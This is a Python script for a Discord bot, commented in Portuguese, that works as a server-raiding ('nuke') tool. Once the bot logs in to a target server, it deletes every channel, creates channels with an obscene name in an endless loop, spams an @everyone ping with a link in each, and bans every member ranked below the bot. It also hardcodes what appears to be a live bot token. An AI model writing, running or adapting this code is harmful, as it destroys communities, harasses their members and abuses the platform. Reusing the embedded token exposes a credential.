import discord
import asyncio

# Substitua 'YOUR_TOKEN' pelo token do seu bot
TOKEN = 'OTA0Mzc5ODY0MjgxNDE1NzIy.GMTp7_.ctbtzbMSo-TRJDFPGOrIggWEcK4_-cjgkUAzKQ'
 
# Substitua 'YOUR_SERVER_ID' pelo ID do servidor onde você deseja realizar as ações
GUILD_ID = 1275272681184432251

# Crie uma instância do cliente
client = discord.Client()

@client.event
async def on_ready():
    print(f'Bot logged in as {client.user}')
    
    guild = discord.utils.get(client.guilds, id=GUILD_ID)
    if guild is None:
        print("Servidor não encontrado!")
        return

    # Deletar todos os canais
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f'Deleted channel: {channel.name}')
        except Exception as e:
            print(f'Failed to delete channel {channel.name}: {e}')

    async def create_channels():
        while True:
            try:
                new_channel = await guild.create_text_channel('range pau no cu')
                print(f'Created a new channel: {new_channel.name}')
                
                await new_channel.send('@everyone https://m.youtube.com/watch?v=mt-DVfVSNd8')
                print('Sent message mentioning @everyone.')
                
                await asyncio.sleep(00.1)  # Ajuste o intervalo conforme necessário
            except Exception as e:
                print(f'Failed to create channel or send message: {e}')
                await asyncio.sleep(00.1)  # Pausa em caso de erro para evitar sobrecarregar a API

    async def ban_members():
        bot_member = guild.get_member(client.user.id)
        if bot_member is None:
            print("Bot não encontrado no servidor!")
            return
        
        bot_role = bot_member.top_role
        forbidden_members = set()

        for member in guild.members:
            # Ignorar o bot e verificar o cargo
            if member == bot_member:
                continue

            # Verificar se o cargo do membro é inferior ao do bot
            if member.top_role.position < bot_role.position:
                try:
                    await member.ban(reason="Banned by bot.")
                    print(f'Banned member: {member.name}')
                except discord.Forbidden:
                    if member.id not in forbidden_members:
                        print(f'No permission to ban member: {member.name}')
                        forbidden_members.add(member.id)
                except discord.HTTPException as e:
                    print(f'HTTP error while banning member {member.name}: {e}')
                except Exception as e:
                    print(f'Failed to ban member {member.name}: {e}')
                
                await asyncio.sleep(00.1)  # Pausa entre banimentos para evitar rate limiting

    # Execute as funções em paralelo
    await asyncio.gather(create_channels(), ban_members())

# Execute o bot
client.run("OTA0Mzc5ODY0MjgxNDE1NzIy.GMTp7_.ctbtzbMSo-TRJDFPGOrIggWEcK4_-cjgkUAzKQ")